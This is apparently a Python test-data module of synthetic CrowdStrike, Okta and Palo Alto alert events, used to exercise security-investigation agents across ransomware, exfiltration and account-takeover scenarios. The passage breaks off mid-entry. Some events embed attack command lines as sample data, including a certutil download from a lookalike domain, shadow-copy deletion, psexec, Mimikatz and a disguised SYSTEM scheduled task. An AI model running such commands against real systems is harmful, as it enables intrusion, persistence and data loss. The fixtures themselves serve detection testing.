"""
Cyphora-S1 Test Event Dataset
==============================
Comprehensive set of SecurityEvent-compatible test events drawn from
three widely-deployed enterprise cybersecurity products:

  CS   CrowdStrike Falcon (EDR/XDR)
  OK   Okta Workforce Identity
  PA   Palo Alto Networks (NGFW / Cortex XDR / Prisma)

Dataset structure
-----------------
Events are grouped by SCENARIO (coordinated attack chains) and by
AGENT_TARGET (which Cyphora-S1 agent each event exercises).  Each event
is a plain dict that can be unpacked into SecurityEvent(**event).

Scenarios
---------
  S1  Ransomware — from phishing to encryption
  S2  Insider Threat / Data Exfiltration
  S3  Credential Compromise & Lateral Movement
  S4  Living-off-the-Land (LOLBin) + DNS Tunnelling
  S5  Cloud Account Takeover

Individual capability tests
---------------------------
  T-INV   CyphoraInvestigationAgent  (all 10 trigger types)
  T-UBA   CyphoraUEBAAgent            (all 5 trigger types)
  T-CMP   CyphoraComplianceAgent      (scheduled + on-demand)
  T-NLQ   CyphoraNLQueryAgent         (10 sample queries)
  T-NEG   Negative / benign events    (should NOT fire investigations)

Usage
-----
    from tests.cyphora_test_events import (
        ALL_EVENTS, SCENARIOS, AGENT_TARGETS, NL_QUERIES,
        get_scenario, get_events_for_agent, get_events_by_severity,
    )
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional

# ── helpers ────────────────────────────────────────────────────────────────


def _ts(offset_minutes: int = 0) -> str:
    """Return an ISO-8601 UTC timestamp offset from 'now'."""
    return (
        datetime.now(tz=timezone.utc) + timedelta(minutes=offset_minutes)
    ).isoformat()


# ══════════════════════════════════════════════════════════════════════════
# SCENARIO S1 — Ransomware: phishing ▶ LOLBin ▶ lateral ▶ encryption
# Products:  CrowdStrike Falcon (CS),  Palo Alto Networks (PA)
# Kill chain: Initial Access → Execution → Persistence → Lateral Movement
#             → Impact (Encryption)
# ══════════════════════════════════════════════════════════════════════════

S1_CROWDSTRIKE_MALICIOUS_MACRO = {
    # Phishing email payload triggers Word macro that spawns PowerShell
    "event_id": "CS-S1-001",
    "event_type": "abnormal_process_execution",
    "severity": "critical",
    "timestamp": _ts(-90),
    "source_ip": "10.10.5.22",
    "user": "jsmith@corp.example",
    "source_host": "LAPTOP-JSMITH",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00441",
        "detection_name": "MALICIOUS_MACRO_EXECUTION",
        "severity_score": 95,
        "parent_process": "WINWORD.EXE",
        "child_process": "powershell.exe",
        "command_line": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMA",
        "process_id": 7832,
        "file_path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\~tmp4f8a.docm",
        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "tactic": "Execution",
        "technique": "T1204.002",
        "technique_name": "User Execution: Malicious File",
        "endpoint_platform": "Windows",
        "os_version": "Windows 11 22H2",
        "crowdstrike_sensor_id": "abc123def456",
        "falcon_prevention_policy": "aggressive",
        "prevented": False,
        "scenario": "S1",
        "scenario_step": 1,
    },
}

S1_PAN_C2_BEACON = {
    # Compromised host establishes C2 channel over HTTPS to known bad IP
    "event_id": "PA-S1-002",
    "event_type": "anomaly_detected",
    "severity": "high",
    "timestamp": _ts(-85),
    "source_ip": "10.10.5.22",
    "user": "jsmith@corp.example",
    "source_host": "LAPTOP-JSMITH",
    "raw_data": {
        "product": "paloalto_ngfw",
        "product_version": "PAN-OS 11.1",
        "log_type": "THREAT",
        "threat_id": "TID-58127",
        "threat_name": "Command-and-Control Beacon Detected",
        "threat_category": "command-and-control",
        "action": "alert",
        "destination_ip": "185.220.101.47",
        "destination_port": 443,
        "destination_country": "RU",
        "protocol": "tcp",
        "application": "ssl",
        "url_category": "command-and-control",
        "bytes_sent": 4096,
        "bytes_received": 51200,
        "session_id": 9812345,
        "rule_name": "C2-Detection-Outbound",
        "nat_source_ip": "203.0.113.5",
        "threat_intel_feed": "Autofocus",
        "malware_family": "CobaltStrike",
        "cortex_xdr_alert": True,
        "scenario": "S1",
        "scenario_step": 2,
    },
}

S1_CROWDSTRIKE_LATERAL_PSEXEC = {
    # Attacker moves laterally using PsExec to a domain controller
    "event_id": "CS-S1-003",
    "event_type": "lateral_movement",
    "severity": "critical",
    "timestamp": _ts(-75),
    "source_ip": "10.10.5.22",
    "user": "jsmith@corp.example",
    "source_host": "DC-CORP-01",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00442",
        "detection_name": "PSEXEC_LATERAL_MOVEMENT",
        "severity_score": 98,
        "parent_process": "services.exe",
        "child_process": "cmd.exe",
        "command_line": "cmd.exe /c psexec.exe \\\\DC-CORP-01 -u CORP\\administrator -p [REDACTED] cmd",
        "source_host": "LAPTOP-JSMITH",
        "destination_host": "DC-CORP-01",
        "destination_ip": "10.0.0.5",
        "tactic": "Lateral Movement",
        "technique": "T1021.002",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "tool_used": "PsExec",
        "prevented": False,
        "crowdstrike_sensor_id": "dc01sensor99",
        "scenario": "S1",
        "scenario_step": 3,
    },
}

S1_CROWDSTRIKE_CREDENTIAL_DUMP = {
    # Attacker runs Mimikatz on the DC to harvest credentials
    "event_id": "CS-S1-004",
    "event_type": "credential_dump",
    "severity": "critical",
    "timestamp": _ts(-70),
    "source_ip": "10.0.0.5",
    "user": "CORP\\administrator",
    "source_host": "DC-CORP-01",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00443",
        "detection_name": "MIMIKATZ_LSASS_DUMP",
        "severity_score": 100,
        "process": "sekurlsa::logonpasswords",
        "tool": "Mimikatz",
        "target_process": "lsass.exe",
        "technique": "T1003.001",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "tactic": "Credential Access",
        "lsass_handle_granted": True,
        "dump_file_written": "C:\\Windows\\Temp\\lsass.dmp",
        "prevented": False,
        "accounts_exposed_count": 47,
        "scenario": "S1",
        "scenario_step": 4,
    },
}

S1_CROWDSTRIKE_RANSOMWARE = {
    # Ransomware begins encrypting files across the network share
    "event_id": "CS-S1-005",
    "event_type": "abnormal_file_encryption",
    "severity": "critical",
    "timestamp": _ts(-60),
    "source_ip": "10.0.0.5",
    "user": "CORP\\administrator",
    "source_host": "FILESERVER-01",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00444",
        "detection_name": "RANSOMWARE_FILE_ENCRYPTION",
        "severity_score": 100,
        "ransomware_family": "BlackCat",
        "files_encrypted_count": 8741,
        "files_per_second": 148,
        "extension_appended": ".alphv",
        "ransom_note_dropped": "C:\\Users\\Public\\README_DECRYPT.txt",
        "shadow_copies_deleted": True,
        "vssadmin_command": "vssadmin.exe delete shadows /all /quiet",
        "affected_shares": [
            "\\\\FILESERVER-01\\Finance",
            "\\\\FILESERVER-01\\HR",
            "\\\\FILESERVER-01\\Legal",
        ],
        "tactic": "Impact",
        "technique": "T1486",
        "technique_name": "Data Encrypted for Impact",
        "prevented": False,
        "scenario": "S1",
        "scenario_step": 5,
    },
}

# ══════════════════════════════════════════════════════════════════════════
# SCENARIO S2 — Insider Threat / Data Exfiltration
# Products:  Okta (OK),  Palo Alto Networks (PA),  CrowdStrike (CS)
# Kill chain: Suspicious Login → Privilege Escalation → Data Staging
#             → Exfiltration
# ══════════════════════════════════════════════════════════════════════════

S2_OKTA_IMPOSSIBLE_TRAVEL = {
    # Same user logs in from New York then Singapore 22 minutes later
    "event_id": "OK-S2-001",
    "event_type": "suspicious_login",
    "severity": "high",
    "timestamp": _ts(-120),
    "source_ip": "103.25.218.44",
    "user": "mwilliams@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "user.authentication.sso",
        "outcome": "SUCCESS",
        "okta_event_id": "evt-8f3a2b91-c4d1-4e5f-a6b7",
        "actor_login": "mwilliams@corp.example",
        "actor_id": "00u8x2k1jKLM9pQrS4y7",
        "client_ip": "103.25.218.44",
        "client_geo_country": "SG",
        "client_geo_city": "Singapore",
        "previous_login_ip": "198.51.100.22",
        "previous_login_country": "US",
        "previous_login_city": "New York",
        "minutes_since_last_login": 22,
        "impossible_travel": True,
        "estimated_travel_speed_mph": 12400,
        "mfa_used": False,
        "mfa_bypass_reason": "remembered_device",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "target_app": "Salesforce CRM",
        "risk_level": "HIGH",
        "okta_risk_score": 88,
        "scenario": "S2",
        "scenario_step": 1,
    },
}

S2_OKTA_ADMIN_GRANT = {
    # The same user is granted org-level admin rights within minutes of the suspicious login
    "event_id": "OK-S2-002",
    "event_type": "privilege_escalation",
    "severity": "critical",
    "timestamp": _ts(-115),
    "source_ip": "103.25.218.44",
    "user": "mwilliams@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "user.account.privilege.grant",
        "outcome": "SUCCESS",
        "okta_event_id": "evt-9a4c3d02-d5e2-5f6a-b7c8",
        "actor_login": "svc_okta_admin@corp.example",
        "actor_role": "SUPER_ADMIN",
        "target_user": "mwilliams@corp.example",
        "target_user_id": "00u8x2k1jKLM9pQrS4y7",
        "privilege_granted": "ORG_ADMIN",
        "previous_role": "USER",
        "granting_ip": "103.25.218.44",
        "same_ip_as_suspicious_login": True,
        "automated_provisioning": False,
        "approved_by": None,
        "ticket_id": None,
        "change_outside_business_hours": True,
        "scenario": "S2",
        "scenario_step": 2,
    },
}

S2_CROWDSTRIKE_DATA_STAGING = {
    # Compromised account uses 7z to archive sensitive finance files
    "event_id": "CS-S2-003",
    "event_type": "anomaly_detected",
    "severity": "high",
    "timestamp": _ts(-108),
    "source_ip": "10.20.15.88",
    "user": "mwilliams@corp.example",
    "source_host": "WKS-MWILLIAMS",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00501",
        "detection_name": "LARGE_ARCHIVE_CREATION",
        "severity_score": 75,
        "process": "7z.exe",
        "command_line": '7z.exe a -tzip -p"S3cr3t!" C:\\Users\\Public\\archive.zip C:\\Finance\\* C:\\HR\\*',
        "archive_size_mb": 2847,
        "files_archived": 18293,
        "source_paths": ["C:\\Finance\\", "C:\\HR\\", "C:\\Legal\\Contracts\\"],
        "destination_path": "C:\\Users\\Public\\archive.zip",
        "tactic": "Collection",
        "technique": "T1560.001",
        "technique_name": "Archive via Utility",
        "scenario": "S2",
        "scenario_step": 3,
    },
}

S2_PAN_EXFIL_UPLOAD = {
    # 2.8 GB uploaded to a personal cloud storage service in one session
    "event_id": "PA-S2-004",
    "event_type": "data_exfiltration",
    "severity": "critical",
    "timestamp": _ts(-100),
    "source_ip": "10.20.15.88",
    "user": "mwilliams@corp.example",
    "source_host": "WKS-MWILLIAMS",
    "raw_data": {
        "product": "paloalto_ngfw",
        "product_version": "PAN-OS 11.1",
        "log_type": "THREAT",
        "threat_id": "TID-90210",
        "threat_name": "Possible Data Exfiltration via File Upload",
        "threat_category": "data-exfiltration",
        "action": "alert",
        "destination_ip": "152.199.39.132",
        "destination_fqdn": "www.dropbox.com",
        "destination_port": 443,
        "protocol": "tcp",
        "application": "dropbox",
        "bytes_sent": 2_987_245_568,
        "bytes_sent_mb": 2850,
        "bytes_received": 14_432,
        "session_duration_seconds": 1247,
        "upload_speed_mbps": 18.3,
        "url_category": "file-sharing",
        "dlp_profile_matched": "PII-Financial",
        "dlp_pattern": "credit_card_number,ssn,bank_account",
        "rule_name": "DLP-Outbound-FileSharing",
        "cortex_xdr_incident_id": "XDR-44821",
        "scenario": "S2",
        "scenario_step": 4,
    },
}

# ══════════════════════════════════════════════════════════════════════════
# SCENARIO S3 — Credential Compromise & Lateral Movement
# Products:  Okta (OK),  CrowdStrike (CS),  Palo Alto Networks (PA)
# Kill chain: Brute Force → MFA Fatigue → Credential Dump → SMB Spread
# ══════════════════════════════════════════════════════════════════════════

S3_OKTA_BRUTE_FORCE = {
    # 47 failed login attempts in 3 minutes from same IP
    "event_id": "OK-S3-001",
    "event_type": "suspicious_login",
    "severity": "high",
    "timestamp": _ts(-200),
    "source_ip": "91.108.56.181",
    "user": "dbrown@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "security.threat.detected",
        "threat_type": "BruteForceLogin",
        "outcome": "FAILURE",
        "okta_event_id": "evt-1b2c3d4e-f5a6-7b8c",
        "actor_login": "dbrown@corp.example",
        "client_ip": "91.108.56.181",
        "client_geo_country": "CN",
        "client_geo_city": "Beijing",
        "failed_attempts_last_3min": 47,
        "password_spray": False,
        "single_account_targeted": True,
        "lockout_triggered": True,
        "lockout_at": _ts(-198),
        "eventual_success": True,
        "success_after_lockout": True,
        "success_ip": "91.108.56.181",
        "mfa_push_notifications_sent": 12,
        "mfa_approved_by_user": True,
        "mfa_approval_method": "okta_verify_push",
        "mfa_fatigue_suspected": True,
        "risk_level": "CRITICAL",
        "okta_risk_score": 97,
        "scenario": "S3",
        "scenario_step": 1,
    },
}

S3_CROWDSTRIKE_LSASS_ACCESS = {
    # Compromised account accesses LSASS — harvesting credentials in memory
    "event_id": "CS-S3-002",
    "event_type": "credential_dump",
    "severity": "critical",
    "timestamp": _ts(-190),
    "source_ip": "10.30.12.45",
    "user": "dbrown@corp.example",
    "source_host": "WKS-DBROWN",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00602",
        "detection_name": "LSASS_PROCESS_HANDLE",
        "severity_score": 94,
        "process": "taskmgr.exe",
        "target_process": "lsass.exe",
        "access_rights": "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION",
        "technique": "T1003.001",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "tactic": "Credential Access",
        "crowdstrike_sensor_id": "wksdbrown77",
        "overwatch_detection": True,
        "overwatch_analyst_notes": "Suspicious LSASS handle opened from taskmgr; inconsistent with normal use pattern.",
        "prevented": True,
        "prevention_action": "blocked",
        "scenario": "S3",
        "scenario_step": 2,
    },
}

S3_PAN_SMB_SCAN = {
    # Internal host scans the entire 10.30.x.x subnet on port 445 (SMB)
    "event_id": "PA-S3-003",
    "event_type": "lateral_movement",
    "severity": "high",
    "timestamp": _ts(-185),
    "source_ip": "10.30.12.45",
    "user": "dbrown@corp.example",
    "source_host": "WKS-DBROWN",
    "raw_data": {
        "product": "paloalto_ngfw",
        "product_version": "PAN-OS 11.1",
        "log_type": "THREAT",
        "threat_id": "TID-31337",
        "threat_name": "Internal SMB Port Scan",
        "threat_category": "scan",
        "action": "reset-both",
        "source_ip": "10.30.12.45",
        "destination_ip_range": "10.30.0.0/16",
        "destination_port": 445,
        "protocol": "tcp",
        "unique_destinations_scanned": 312,
        "scan_duration_seconds": 38,
        "scan_rate_hosts_per_second": 8.2,
        "successful_connections": 28,
        "rule_name": "IPS-Internal-Scan-Block",
        "ips_signature": "40001 — TCP Port Scan",
        "cortex_xdr_incident_id": "XDR-44900",
        "scenario": "S3",
        "scenario_step": 3,
    },
}

S3_CROWDSTRIKE_WMI_LATERAL = {
    # WMI remote execution used to run commands on 5 hosts
    "event_id": "CS-S3-004",
    "event_type": "lateral_movement",
    "severity": "critical",
    "timestamp": _ts(-180),
    "source_ip": "10.30.12.45",
    "user": "CORP\\dbrown",
    "source_host": "APPSERVER-02",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00603",
        "detection_name": "WMI_REMOTE_EXECUTION",
        "severity_score": 92,
        "process": "WmiPrvSE.exe",
        "command_line": 'wmic /node:"APPSERVER-02" /user:"CORP\\dbrown" process call create "cmd.exe /c whoami > C:\\Temp\\out.txt"',
        "technique": "T1047",
        "technique_name": "Windows Management Instrumentation",
        "tactic": "Lateral Movement",
        "target_hosts": [
            "APPSERVER-02",
            "SQLSERVER-01",
            "DEVOPS-BUILD-01",
            "BACKUP-SRV",
            "MGMT-JUMP-01",
        ],
        "targets_count": 5,
        "prevented": False,
        "scenario": "S3",
        "scenario_step": 4,
    },
}

# ══════════════════════════════════════════════════════════════════════════
# SCENARIO S4 — Living-off-the-Land + DNS Tunnelling
# Products:  CrowdStrike (CS),  Palo Alto Networks (PA)
# Kill chain: LOLBin execution → Persistence → C2 via DNS → Exfil
# ══════════════════════════════════════════════════════════════════════════

S4_CROWDSTRIKE_LOLBIN = {
    # certutil used to download a malicious payload (classic LOLBin)
    "event_id": "CS-S4-001",
    "event_type": "abnormal_process_execution",
    "severity": "high",
    "timestamp": _ts(-300),
    "source_ip": "10.40.8.17",
    "user": "svc_backup@corp.example",
    "source_host": "BACKUP-SRV",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00701",
        "detection_name": "LOLBIN_CERTUTIL_DOWNLOAD",
        "severity_score": 82,
        "process": "certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://update.windowscdn-cdn.com/svchost.exe C:\\Windows\\Temp\\svc32.exe",
        "parent_process": "cmd.exe",
        "grandparent_process": "WmiPrvSE.exe",
        "downloaded_file": "C:\\Windows\\Temp\\svc32.exe",
        "download_url": "http://update.windowscdn-cdn.com/svchost.exe",
        "file_sha256": "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
        "technique": "T1105",
        "technique_name": "Ingress Tool Transfer",
        "tactic": "Command and Control",
        "prevented": False,
        "scenario": "S4",
        "scenario_step": 1,
    },
}

S4_CROWDSTRIKE_SCHEDULED_TASK = {
    # Malicious scheduled task created for persistence
    "event_id": "CS-S4-002",
    "event_type": "abnormal_process_execution",
    "severity": "high",
    "timestamp": _ts(-295),
    "source_ip": "10.40.8.17",
    "user": "svc_backup@corp.example",
    "source_host": "BACKUP-SRV",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-2025-00702",
        "detection_name": "SUSPICIOUS_SCHEDULED_TASK",
        "severity_score": 78,
        "process": "schtasks.exe",
        "command_line": 'schtasks /create /tn "\\Microsoft\\Windows\\WinUpdate" /tr "C:\\Windows\\Temp\\svc32.exe" /sc ONLOGON /ru SYSTEM /f',
        "task_name": "\\Microsoft\\Windows\\WinUpdate",
        "task_action": "C:\\Windows\\Temp\\svc32.exe",
        "run_as": "SYSTEM",
        "trigger": "ONLOGON",
        "masquerading_as_legit_task": True,
        "technique": "T1053.005",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "tactic": "Persistence",
        "prevented": False,
        "scenario": "S4",
        "scenario_step": 2,
    },
}

S4_PAN_DNS_TUNNEL = {
    # DNS tunnelling detected — large TXT record queries to attacker-owned domain
    "event_id": "PA-S4-003",
    "event_type": "data_exfiltration",
    "severity": "critical",
    "timestamp": _ts(-280),
    "source_ip": "10.40.8.17",
    "user": "svc_backup@corp.example",
    "source_host": "BACKUP-SRV",
    "raw_data": {
        "product": "paloalto_ngfw",
        "product_version": "PAN-OS 11.1",
        "log_type": "THREAT",
        "threat_id": "TID-86001",
        "threat_name": "DNS Tunneling Data Exfiltration",
        "threat_category": "dns-tunneling",
        "action": "sinkhole",
        "source_ip": "10.40.8.17",
        "destination_ip": "8.8.8.8",
        "destination_port": 53,
        "protocol": "udp",
        "dns_query_count_last_hour": 4281,
        "dns_query_avg_label_length": 58,
        "dns_query_entropy": 4.9,
        "suspicious_domain": "c2tunnel.exfil-ops.xyz",
        "dns_record_types": ["TXT", "NULL"],
        "data_encoded_in_queries_bytes": 384_000,
        "tunnel_tool_suspected": "iodine",
        "ips_signature": "14978 — DNS C2 Tunneling",
        "threat_intel_match": True,
        "cortex_xdr_incident_id": "XDR-45123",
        "scenario": "S4",
        "scenario_step": 3,
    },
}

# ══════════════════════════════════════════════════════════════════════════
# SCENARIO S5 — Cloud Account Takeover
# Products:  Okta (OK),  Palo Alto Networks Prisma Cloud (PA)
# Kill chain: Credential Stuffing → Session Hijack → Cloud API Abuse
# ══════════════════════════════════════════════════════════════════════════

S5_OKTA_CREDENTIAL_STUFFING = {
    # Automated credential stuffing from 180 IPs, 6 successes
    "event_id": "OK-S5-001",
    "event_type": "suspicious_login",
    "severity": "critical",
    "timestamp": _ts(-400),
    "source_ip": "45.33.32.156",
    "user": "multiple",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "security.threat.detected",
        "threat_type": "CredentialStuffing",
        "outcome": "PARTIAL_SUCCESS",
        "okta_event_id": "evt-bulk-cred-stuffing-0042",
        "total_login_attempts": 1240,
        "unique_source_ips": 180,
        "successful_logins": 6,
        "successful_accounts": [
            "aclarke@corp.example",
            "ptorres@corp.example",
            "kjones@corp.example",
            "bnguyen@corp.example",
            "wchen@corp.example",
            "fkowalski@corp.example",
        ],
        "duration_minutes": 4,
        "password_spray": True,
        "botnet_suspected": True,
        "tor_ips_detected": 23,
        "residential_proxy_ips": 157,
        "okta_thr_intelligence": "KNOWN_COMPROMISED_CREDENTIALS",
        "risk_level": "CRITICAL",
        "okta_risk_score": 100,
        "scenario": "S5",
        "scenario_step": 1,
    },
}

S5_PAN_CLOUD_API_ABUSE = {
    # Compromised cloud admin account makes mass IAM changes and spins up EC2 miners
    "event_id": "PA-S5-002",
    "event_type": "confirmed_attack",
    "severity": "critical",
    "timestamp": _ts(-390),
    "source_ip": "45.33.32.156",
    "user": "aclarke@corp.example",
    "source_host": "prisma-cloud",
    "raw_data": {
        "product": "paloalto_prisma_cloud",
        "product_version": "Prisma Cloud 24.11",
        "alert_id": "PC-ALERT-88241",
        "alert_name": "Anomalous AWS API Activity — Cryptomining + IAM Abuse",
        "severity": "CRITICAL",
        "cloud_provider": "AWS",
        "cloud_account_id": "123456789012",
        "cloud_region": "us-east-1",
        "actor_arn": "arn:aws:iam::123456789012:user/aclarke",
        "api_calls_last_hour": [
            {"api": "ec2:RunInstances", "count": 40, "instance_type": "p3.8xlarge"},
            {"api": "iam:CreateUser", "count": 12},
            {
                "api": "iam:AttachUserPolicy",
                "count": 12,
                "policy": "AdministratorAccess",
            },
            {"api": "iam:CreateAccessKey", "count": 12},
            {"api": "s3:PutBucketPolicy", "count": 5, "change": "public_access"},
            {"api": "cloudtrail:DeleteTrail", "count": 2},
        ],
        "ec2_instances_launched": 40,
        "ec2_estimated_hourly_cost": 1280,
        "new_iam_admin_users": 12,
        "cloudtrail_disabled": True,
        "cryptomining_network_signature": True,
        "mining_pool_ips": ["pool.hashvault.pro", "xmr.pool.minergate.com"],
        "cortex_xdr_incident_id": "XDR-46001",
        "scenario": "S5",
        "scenario_step": 2,
    },
}

S5_OKTA_SESSION_HIJACK = {
    # Session token reuse from a different device fingerprint and IP
    "event_id": "OK-S5-003",
    "event_type": "suspicious_login",
    "severity": "high",
    "timestamp": _ts(-385),
    "source_ip": "198.18.0.99",
    "user": "kjones@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "user.session.access",
        "outcome": "SUCCESS",
        "okta_event_id": "evt-sess-hijack-0199",
        "actor_login": "kjones@corp.example",
        "session_id": "ses-101xyz",
        "original_session_ip": "10.10.77.5",
        "current_request_ip": "198.18.0.99",
        "original_device_fingerprint": "fp_mac_chrome_macos",
        "current_device_fingerprint": "fp_win_ff_windows",
        "fingerprint_mismatch": True,
        "session_age_hours": 0.3,
        "session_reuse_from_new_ip": True,
        "geolocation_mismatch": True,
        "original_country": "US",
        "current_country": "NL",
        "risk_level": "HIGH",
        "okta_risk_score": 91,
        "scenario": "S5",
        "scenario_step": 3,
    },
}

# ══════════════════════════════════════════════════════════════════════════
# INDIVIDUAL CAPABILITY TESTS (T-INV, T-UBA, T-CMP, T-NLQ)
# ══════════════════════════════════════════════════════════════════════════

# ── T-INV: CyphoraInvestigationAgent trigger coverage ──────────────────

TINV_SUSPICIOUS_LOGIN_CROWDSTRIKE = {
    # Test suspicious_login trigger via CrowdStrike (EDR credential alert)
    "event_id": "CS-TINV-001",
    "event_type": "suspicious_login",
    "severity": "high",
    "timestamp": _ts(-5),
    "source_ip": "10.0.0.88",
    "user": "hradmin@corp.example",
    "source_host": "WKS-HR-ADMIN",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-TINV-001",
        "detection_name": "SUSPICIOUS_CREDENTIAL_USE",
        "severity_score": 72,
        "reason": "Login outside geo baseline — user always authenticates from Austin TX, this login is from Bucharest RO",
        "process": "lsass.exe",
        "technique": "T1078",
        "technique_name": "Valid Accounts",
        "tactic": "Defense Evasion",
        "test_case": "T-INV-suspicious_login",
    },
}

TINV_ANOMALY_DETECTED_PALOALTO = {
    # Test anomaly_detected trigger via PAN threat prevention
    "event_id": "PA-TINV-002",
    "event_type": "anomaly_detected",
    "severity": "medium",
    "timestamp": _ts(-4),
    "source_ip": "10.0.5.100",
    "user": "devops_ci@corp.example",
    "source_host": "CI-RUNNER-07",
    "raw_data": {
        "product": "paloalto_cortex_xdr",
        "product_version": "Cortex XDR 3.12",
        "alert_id": "XDR-TINV-002",
        "alert_name": "Behavioral Anomaly — Unusual Outbound Connection",
        "anomaly_type": "NETWORK_BEHAVIORAL",
        "baseline_deviation_score": 0.87,
        "usual_egress_mb_per_day": 120,
        "today_egress_mb": 4200,
        "deviation_factor": 35,
        "destination_asn": 209588,
        "destination_country": "UA",
        "test_case": "T-INV-anomaly_detected",
    },
}

TINV_CONFIRMED_ATTACK_OKTA = {
    # Test confirmed_attack trigger — Okta labels event as confirmed threat
    "event_id": "OK-TINV-003",
    "event_type": "confirmed_attack",
    "severity": "critical",
    "timestamp": _ts(-3),
    "source_ip": "198.51.100.55",
    "user": "csuite_ea@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "security.threat.detected",
        "threat_type": "AccountCompromise",
        "outcome": "DETECTED",
        "threat_confirmed": True,
        "threat_source": "Okta ThreatInsight",
        "threat_intel_reference": "OTID-2025-0881",
        "actor_login": "csuite_ea@corp.example",
        "attacker_ip": "198.51.100.55",
        "attacker_known_threat_actor": "APT29",
        "test_case": "T-INV-confirmed_attack",
    },
}

TINV_UEBA_ANOMALY_SYNTHETIC = {
    # Synthetic ueba_anomaly event (emitted by CyphoraUEBAAgent)
    "event_id": "SYN-TINV-004",
    "event_type": "ueba_anomaly",
    "severity": "high",
    "timestamp": _ts(-2),
    "source_ip": "10.0.8.44",
    "user": "patel_r@corp.example",
    "source_host": "WKS-PATELR",
    "raw_data": {
        "product": "cyphora_ueba",
        "risk_score": 0.87,
        "risk_label": "CRITICAL",
        "entity_id": "patel_r@corp.example",
        "anomalies": [
            {
                "feature": "login_hour",
                "deviation_score": 0.95,
                "explanation": "Login at 02:37 AM; baseline 08:30–17:00",
            },
            {
                "feature": "bytes_transferred",
                "deviation_score": 0.88,
                "explanation": "620 MB transferred; baseline < 30 MB/day",
            },
            {
                "feature": "unique_hosts_accessed",
                "deviation_score": 0.72,
                "explanation": "14 unique hosts; baseline 2–3",
            },
        ],
        "baseline_days": 90,
        "emitted_by": "CyphoraUEBAAgent",
        "test_case": "T-INV-ueba_anomaly",
    },
}

# ── T-UBA: CyphoraUEBAAgent trigger coverage ───────────────────────────

TUBA_SUSPICIOUS_LOGIN_OKTA = {
    # UEBA test: Okta login at unusual hour from new device
    "event_id": "OK-TUBA-001",
    "event_type": "suspicious_login",
    "severity": "medium",
    "timestamp": _ts(-10),
    "source_ip": "10.10.22.5",
    "user": "lzhang@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "user.authentication.sso",
        "outcome": "SUCCESS",
        "login_hour": 2,
        "day_of_week": "Sunday",
        "new_device": True,
        "device_os": "Linux",
        "user_agent": "curl/7.81.0",
        "mfa_used": True,
        "mfa_method": "totp",
        "okta_risk_score": 55,
        "test_case": "T-UBA-suspicious_login",
    },
}

TUBA_DATA_EXFIL_PAN = {
    # UEBA test: gradual data exfil under DLP thresholds (slow drip)
    "event_id": "PA-TUBA-002",
    "event_type": "data_exfiltration",
    "severity": "medium",
    "timestamp": _ts(-9),
    "source_ip": "10.55.7.33",
    "user": "contractor_ext@vendor.example",
    "source_host": "CONTRACTOR-PC",
    "raw_data": {
        "product": "paloalto_ngfw",
        "product_version": "PAN-OS 11.1",
        "log_type": "URL",
        "action": "allow",
        "destination_fqdn": "drive.google.com",
        "bytes_sent_mb_today": 380,
        "bytes_sent_mb_30day_avg": 12,
        "slow_exfil_pattern": True,
        "daily_upload_counts": [8, 11, 9, 14, 18, 27, 45, 89, 178, 380],
        "dlp_profile_matched": "Intellectual-Property",
        "test_case": "T-UBA-data_exfiltration",
    },
}

TUBA_LATERAL_MOVEMENT_CS = {
    # UEBA test: service account suddenly makes lateral RDP connections
    "event_id": "CS-TUBA-003",
    "event_type": "lateral_movement",
    "severity": "high",
    "timestamp": _ts(-8),
    "source_ip": "10.0.50.10",
    "user": "svc_monitoring@corp.example",
    "source_host": "MONITORING-SRV",
    "raw_data": {
        "product": "crowdstrike_falcon",
        "product_version": "7.15",
        "alert_id": "CID-TUBA-003",
        "detection_name": "SERVICE_ACCOUNT_RDP_ANOMALY",
        "process": "mstsc.exe",
        "unique_rdp_targets": 8,
        "rdp_targets": [
            "APPSERVER-01",
            "APPSERVER-02",
            "SQLSERVER-01",
            "SQLSERVER-02",
            "DEVOPS-01",
            "DEVOPS-02",
            "BACKUP-01",
            "DC-CORP-02",
        ],
